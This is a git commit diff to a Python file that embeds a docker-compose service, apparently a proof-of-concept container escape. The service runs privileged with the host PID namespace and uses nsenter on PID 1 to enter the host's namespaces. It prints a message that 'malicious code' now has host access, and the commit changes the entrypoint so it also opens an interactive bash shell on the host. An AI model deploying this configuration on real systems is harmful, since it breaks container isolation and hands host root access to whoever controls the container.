f75b6a27a954d767cc5961005a95e1ba72ed6184
gdesantis01 <105500021+gdesantis01@users.noreply.github.com>
2025-06-23 22:33:08 +0200

    Update access.py

--- access.py
+++ access.py
@@ -15,9 +15,10 @@ services:
     privileged: true
     pid: host
 
-    entrypoint: [ "bash", "-c", "nsenter --target 1 --mount --uts --ipc --net --pid -- bash -c 'sleep 1;echo\"Malicious code now has access to the $(whoami) user on the host system\n\n> Try to exec whoami or commands with root privileges\"'" ]
+    entrypoint: [ "bash", "-c", "nsenter --target 1 --mount --uts --ipc --net --pid -- bash -c 'sleep 1;echo \"Malicious code now has access to the $(whoami) user on the host system\n> Try to exec whoami or commands with root privileges\"; bash'" ]
 
     profiles: ["exclude-from-up"]
+
 """)
 
 import subprocess
